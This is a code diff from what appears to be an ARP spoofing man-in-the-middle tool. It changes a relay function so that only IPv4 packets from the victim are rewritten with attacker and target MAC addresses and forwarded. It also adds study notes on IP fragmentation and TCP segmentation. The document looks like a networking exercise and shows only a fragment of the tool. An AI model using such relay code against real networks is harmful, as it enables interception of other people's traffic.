@@ -168,20 +168,36 @@ void RelayPacket(pcap_t* handle, const u_char* data, struct pcap_pkthdr* header,
             }
         }
     }
-    else if(!(memcmp(capture->eth_.Src_mac, sender_mac, sizeof(uint8_t)*6)) && !(memcmp(capture->eth_.Dst_mac, attacker_mac, sizeof(uint8_t)*6))){
-        memcpy(capture->eth_.Src_mac, attacker_mac, sizeof(uint8_t)*6);
-        memcpy(capture->eth_.Dst_mac, target_mac, sizeof(uint8_t)*6);
-        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(data),header->caplen);
-        if (res != 0) {
-            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+    else if(ntohs(capture->eth_.type) == Ip4){
+        if(!(memcmp(capture->eth_.Src_mac, sender_mac, sizeof(uint8_t)*6)) && !(memcmp(capture->eth_.Dst_mac, attacker_mac, sizeof(uint8_t)*6))){
+            memcpy(capture->eth_.Src_mac, attacker_mac, sizeof(uint8_t)*6);
+            memcpy(capture->eth_.Dst_mac, target_mac, sizeof(uint8_t)*6);
+            int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(data),header->caplen);
+            if (res != 0) {
+                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+            }
+            PrintIP(" Relaying....   ",ntohl(sender_ip));
+            PrintIP(" -> ",ntohl(target_ip));
+            printf("\n");
         }
-        PrintIP(" Relaying....   ",ntohl(sender_ip));
-        PrintIP(" -> ",ntohl(target_ip));
-        printf("\n");
     }
 }
 void Relay(pcap_t* handle, uint8_t* ATTACKER_MAC, ARP_Table* Table, int pair_num){
+/*
+ * - fragmentation
+eth ip tc[ data1
+eth ip data2
+eth ip data3
+=> udp icmp
+=> ip stack
 
+- Segmentation
+eth ip tcp data1
+eth ip tcp data2
+eth ip tcp data3
+=> tcp stack
+=> 어플리케이션 레벨에서 MTU를 하지 않도록
+*/
     struct pcap_pkthdr* header;
     const u_char* data;
     struct timeval start, current;
